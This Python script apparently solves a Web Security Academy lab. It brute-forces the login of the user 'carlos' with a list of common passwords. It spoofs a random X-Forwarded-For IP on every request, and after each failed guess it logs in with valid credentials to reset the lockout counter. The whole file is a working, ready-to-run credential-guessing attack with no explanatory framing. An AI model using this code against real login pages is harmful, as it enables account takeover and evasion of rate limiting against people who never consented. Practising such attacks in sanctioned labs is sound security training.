import random
import requests
import time
from bs4 import BeautifulSoup
import time
from requests import session

fake_ip = fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
header = {"X-Forwarded-For": fake_ip}

url = "https://0a23004e0401cbd4831b8cc8001000ad.web-security-academy.net/login"
data = {
        "username": "wiener",
        "password": "peter"
    }

r = requests.post(url, data=data,headers=header,timeout=10)


password = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]
local_pass = password


local = ""
cnt = 0
print("USER:", "carlos")
local_pass = password.copy()
i = 0
while i != len(local_pass):
    local = local_pass[i]
    data = {
        "username": "carlos",
        "password": local_pass[i]
    }
    fake_ip = fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    header = {"X-Forwarded-For": fake_ip}

    try:
        r = requests.post(url, data=data,headers=header,timeout=10)
        print(f"{"carlos"}:{local_pass[i]}")
        if r.status_code == 200 and "Incorrect password" not in r.text :
            print("FOUND:", "carlos", local_pass[i])
            print(r.text)
            local_pass.remove(local_pass[i])
            exit()
        else:
                local_pass.remove(local_pass[i])
        cnt += 1
        if cnt == 1:
             data = {
        "username": "wiener",
        "password": "peter"
    }
             cnt = 0
        r = requests.post(url, data=data,headers=header,timeout=10)
    except requests.exceptions.RequestException as e:
        local_pass.append(local)
        print("ERROR:", e)
        time.sleep(1)